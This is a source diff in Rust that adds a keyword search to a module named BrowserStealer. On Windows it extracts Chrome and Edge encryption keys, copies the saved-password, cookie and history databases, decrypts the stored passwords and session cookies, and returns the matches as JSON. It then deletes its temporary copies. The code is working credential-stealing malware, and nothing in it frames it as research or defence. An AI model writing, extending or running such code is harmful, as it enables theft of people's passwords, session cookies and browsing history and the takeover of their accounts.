@@ -13,6 +13,95 @@ impl BrowserStealer {
         }
     }
 
+    pub fn search(browser_type: &str, keyword: &str) -> String {
+        #[cfg(target_os = "windows")]
+        {
+            Self::search_windows(browser_type, keyword)
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            let _ = (browser_type, keyword);
+            r#"{"total":0,"items":[]}"#.to_string()
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    fn search_windows(browser_type: &str, keyword: &str) -> String {
+        let local_appdata = dirs_local_appdata();
+        let keyword_lower = keyword.to_lowercase();
+
+        let browsers: &[(&str, &str)] = match browser_type {
+            "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
+            "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
+            _ => &[
+                ("Chrome", r"Google\Chrome\User Data"),
+                ("Edge", r"Microsoft\Edge\User Data"),
+            ],
+        };
+
+        let mut matched = Vec::new();
+
+        for (name, rel_path) in browsers {
+            let user_data = format!(r"{}\{}", local_appdata, rel_path);
+            let p = std::path::Path::new(&user_data);
+            if !p.exists() { continue; }
+
+            let ls_path = p.join("Local State");
+            let v10_key = extract_v10_key(&ls_path);
+            let v20_key = extract_v20_key(&ls_path);
+
+            let default = p.join("Default");
+
+            // Search passwords
+            let login_db = default.join("Login Data");
+            if login_db.exists() {
+                let tmp = copy_to_temp(&login_db);
+                if let Some(ref tmp_path) = tmp {
+                    search_logins(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
+                    let _ = std::fs::remove_file(tmp_path);
+                    for ext in &["-wal", "-shm"] {
+                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
+                    }
+                }
+            }
+
+            // Search cookies
+            let cookie_db = default.join("Network").join("Cookies");
+            let cookie_db2 = default.join("Cookies");
+            let cookie_path = if cookie_db.exists() { &cookie_db } else { &cookie_db2 };
+            if cookie_path.exists() {
+                let tmp = copy_to_temp(cookie_path);
+                if let Some(ref tmp_path) = tmp {
+                    search_cookies(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
+                    let _ = std::fs::remove_file(tmp_path);
+                    for ext in &["-wal", "-shm"] {
+                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
+                    }
+                }
+            }
+
+            // Search history
+            let hist_db = default.join("History");
+            if hist_db.exists() {
+                let tmp = copy_to_temp(&hist_db);
+                if let Some(ref tmp_path) = tmp {
+                    search_history(name, tmp_path, &keyword_lower, &mut matched);
+                    let _ = std::fs::remove_file(tmp_path);
+                    for ext in &["-wal", "-shm"] {
+                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
+                    }
+                }
+            }
+        }
+
+        let total = matched.len();
+        format!(
+            r#"{{"total":{},"items":[{}]}}"#,
+            total,
+            matched.join(",")
+        )
+    }
+
     #[cfg(target_os = "windows")]
     fn collect_windows(browser_type: &str, offset: usize, limit: usize) -> String {
         let local_appdata = dirs_local_appdata();
@@ -94,6 +183,138 @@ impl BrowserStealer {
             items.join(",")
         )
     }
+}
+
+// ── Search helpers ──────────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
+fn search_logins(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, keyword: &str, items: &mut Vec<String>) {
+    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+
+    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+
+    let _ = stmt.query_map([], |row| {
+        let url: String = row.get(0)?;
+        let user: String = row.get(1)?;
+        let enc: Vec<u8> = row.get(2)?;
+        Ok((url, user, enc))
+    }).map(|rows| {
+        for row in rows.flatten() {
+            let (url, user, enc) = row;
+            if enc.len() < 3 { continue; }
+            let ver = match (&enc[..3], enc.get(1)) {
+                (b"v10", _) => "v10",
+                (b"v20", _) => "v20",
+                _ => "?",
+            };
+
+            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
+            let pass = key.and_then(|k| decrypt_aes_gcm(&enc, k, false));
+            let displayed = pass.unwrap_or_default();
+
+            // Match keyword against url, username, password
+            let haystack = format!("{} {} {}", url, user, displayed).to_lowercase();
+            if !haystack.contains(keyword) { continue; }
+
+            items.push(format!(
+                r#"{{"browser":"{}","type":"password","url":"{}","username":"{}","password":"{}","version":"{}"}}"#,
+                escape(name),
+                escape(&url),
+                escape(&user),
+                escape(&displayed),
+                ver
+            ));
+        }
+    });
+}
+
+#[cfg(target_os = "windows")]
+fn search_cookies(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, keyword: &str, items: &mut Vec<String>) {
+    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+
+    let mut stmt = match conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+
+    let _ = stmt.query_map([], |row| {
+        let host: String = row.get(0)?;
+        let cname: String = row.get(1)?;
+        let enc: Vec<u8> = row.get(2)?;
+        Ok((host, cname, enc))
+    }).map(|rows| {
+        for row in rows.flatten() {
+            let (host, cname, enc) = row;
+            if enc.len() < 3 { continue; }
+            let ver = match (&enc[..3], enc.get(1)) {
+                (b"v10", _) => "v10",
+                (b"v20", _) => "v20",
+                _ => "?",
+            };
+
+            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
+            let val = key.and_then(|k| decrypt_aes_gcm(&enc, k, true));
+            let displayed = val.unwrap_or_default();
+
+            // Match keyword against host, name, value
+            let haystack = format!("{} {} {}", host, cname, displayed).to_lowercase();
+            if !haystack.contains(keyword) { continue; }
+
+            items.push(format!(
+                r#"{{"browser":"{}","type":"cookie","host":"{}","name":"{}","value":"{}","version":"{}"}}"#,
+                escape(name),
+                escape(&host),
+                escape(&cname),
+                escape(&displayed),
+                ver
+            ));
+        }
+    });
+}
+
+#[cfg(target_os = "windows")]
+fn search_history(name: &str, db_path: &str, keyword: &str, items: &mut Vec<String>) {
+    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+
+    let mut stmt = match conn.prepare("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5000") {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+
+    let _ = stmt.query_map([], |row| {
+        let url: String = row.get(0)?;
+        let title: String = row.get(1)?;
+        let visits: i32 = row.get(2)?;
+        Ok((url, title, visits))
+    }).map(|rows| {
+        for row in rows.flatten() {
+            let (url, title, visits) = row;
+
+            // Match keyword against url, title
+            let haystack = format!("{} {}", url, title).to_lowercase();
+            if !haystack.contains(keyword) { continue; }
+
+            items.push(format!(
+                r#"{{"browser":"{}","type":"history","url":"{}","title":"{}","visits":{}}}"#,
+                escape(name),
+                escape(&url),
+                escape(&title),
+                visits
+            ));
+        }
+    });
 }
 
 // ── v10 DPAPI Key ─────────────────────────────────────────────────────────
